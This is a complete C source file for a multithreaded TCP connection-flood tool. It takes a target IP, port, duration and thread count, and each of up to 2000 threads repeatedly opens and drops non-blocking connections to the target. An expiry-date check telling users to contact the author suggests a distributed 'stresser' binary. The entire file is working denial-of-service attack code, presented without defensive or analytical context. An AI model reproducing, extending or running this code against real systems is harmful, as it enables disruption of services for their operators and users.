#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>
#include <signal.h>
#include <string.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>

#define MAX_THREADS 2000
#define EXPIRATION_YEAR 2028
#define EXPIRATION_MONTH 4
#define EXPIRATION_DAY 15

int keep_running = 1;
volatile unsigned long total_connections = 0;

typedef struct {
    char *target_ip;
    int target_port;
    int duration;
    int thread_id;
} attack_params;

void handle_signal(int sig) {
    keep_running = 0;
}

int create_tcp_socket() {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;
    
    // Set non-blocking for fast connect
    fcntl(sock, F_SETFL, O_NONBLOCK);
    
    // Reuse address and port
    int reuse = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    
    return sock;
}

void *tcp_flood(void *args) {
    attack_params *params = (attack_params *)args;
    struct sockaddr_in target;
    unsigned int seed = time(NULL) ^ pthread_self();
    time_t end_time = time(NULL) + params->duration;
    unsigned long connections = 0;

    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(params->target_port);
    inet_pton(AF_INET, params->target_ip, &target.sin_addr);

    while (keep_running && time(NULL) < end_time) {
        int sock = create_tcp_socket();
        if (sock < 0) continue;

        // Fast non-blocking connect
        int result = connect(sock, (struct sockaddr *)&target, sizeof(target));
        
        if (result < 0 && errno != EINPROGRESS) {
            close(sock);
            continue;
        }

        // Immediate close - no data sending
        close(sock);
        connections++;
        
        // Small delay to avoid overwhelming system
        if (connections % 100 == 0) {
            usleep(1000);
        }
    }

    __sync_fetch_and_add(&total_connections, connections);
    return NULL;
}

int main(int argc, char *argv[]) {
    time_t now = time(NULL);
    struct tm expiry_tm = {0};
    expiry_tm.tm_year = EXPIRATION_YEAR - 1900;
    expiry_tm.tm_mon = EXPIRATION_MONTH - 1;
    expiry_tm.tm_mday = EXPIRATION_DAY;
    time_t expiry_time = mktime(&expiry_tm);

    if (difftime(now, expiry_time) > 0) {
        printf("This binary has expired. Contact the author for an updated version.\n");
        return EXIT_FAILURE;
    }

    if (argc < 5) {
        printf("Usage: %s <IP> <PORT> <TIME> <THREADS>\n", argv[0]);
        return EXIT_FAILURE;
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int thread_count = atoi(argv[4]);

    if (thread_count > MAX_THREADS) {
        thread_count = MAX_THREADS;
    }

    signal(SIGINT, handle_signal);
    srand(time(NULL));

    pthread_t threads[MAX_THREADS];
    attack_params params[MAX_THREADS];

    printf("TCP Flood started on %s:%d for %d seconds using %d threads\n",
           target_ip, target_port, duration, thread_count);

    for (int i = 0; i < thread_count; i++) {
        params[i] = (attack_params){
            .target_ip = target_ip,
            .target_port = target_port,
            .duration = duration,
            .thread_id = i
        };
        pthread_create(&threads[i], NULL, tcp_flood, &params[i]);
    }

    // Progress reporting
    time_t start_time = time(NULL);
    while (keep_running && (time(NULL) - start_time) < duration) {
        sleep(1);
        printf("\rConnections: %lu | Running: %lds", total_connections, time(NULL) - start_time);
        fflush(stdout);
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("\nFinished: %lu total connections\n", total_connections);
    return EXIT_SUCCESS;
}
